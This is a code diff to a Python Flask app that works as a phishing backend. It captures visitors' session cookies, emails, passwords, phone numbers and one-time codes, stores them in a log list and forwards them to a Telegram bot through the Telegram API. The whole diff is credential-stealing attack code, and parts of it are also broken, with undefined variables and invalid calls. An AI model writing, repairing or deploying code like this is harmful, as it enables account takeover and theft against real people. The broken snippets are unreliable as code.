@@ -18,31 +18,32 @@ print("CWD:", os.getcwd())
 BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
 CHAT_ID = os.getenv("TG_CHAT_ID")
 
+logs = []
+
 app = Flask(__name__, template_folder="templates")
 
 @app.before_request
 def init_data():
-    data = {
+
+    g.data = {
         "cookies": request.headers.get("Cookie",""),
         "email": "",
         "password": "",
         "phone": "",
         "otp": "",
-        "device_browser": request.headers.get("User-Agent", ""),
-        "ip": request.remote_addr,
         "user_agent": request.headers.get("User-Agent")
     }
     
     message = f"""
-    Cookies: {data['Cookie']}
-    Email: {data['email']}
-    Password: {data['password']}
-    Phone: {data['phone']}
-    OTP: {data['otp']}
+    Cookies: {g.data("Cookies", "")}
+    Email: {data("email", "")}
+    Password: {data("password", "")}
+    Phone: {data("phone", "")}
+    OTP: {data("otp","")}
     """
     
 def before_request_func():
-    cookies = request.headers.get("Cookie")
+    Cookies = g.data.get("Cookie", "")
     
     message = f"""
     Cookies: {cookie}
@@ -51,8 +52,8 @@ def before_request_func():
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                       "chat_id": CHAT_ID,
                       "text": message
-     })
-     
+         }    
+    )
     
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -74,25 +75,31 @@ def send_to_telegram(data):
         pass
             
 def collect_sessions():
+    # إضافة السجل في logs من g.data مباشرة
+    logs.append({
+        "email": g.data.get("email", ""),
+        "password": g.data.get("password", ""),
+        "phone": g.data.get("phone", ""),
+        "otp": g.data.get("otp", ""),
+        "ip": g.data.get("ip", ""),
+        "cookies": g.data.get("cookies", "")
+    })
 
-    logs = []
-    data = request.get_json()
-    email = data.get("email")
-    password = data.get("password")
-    phone = data.get("phone")
-    otp = data.get("otp")
-    
-    logs.append({"email": email, "password": password, "phone": phone, "otp": otp})
-    
+    # الرسالة المرتبة
     message = f"""
-    Email: {email}
-    Password: {password}
-    Phone: {phone}
-    OTP: {otp}
-    IP: {ip}
-    '''.
-    """
+    Cookies: {g.data.get("cookies", "")}
+    Email: {g.data.get("email", "")}
+    Password: {g.data.get("password", "")}
+    Phone: {g.data.get("phone", "")}
+    OTP: {g.data.get("otp", "")}
+    IP: {g.data.get("ip", "")}
+    """ 
     
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                      "chat_id": CHAT_ID,
+                      "text": message
+                  }
+    )            
     
     try:
         session_data = request.headers.get("Authorization")
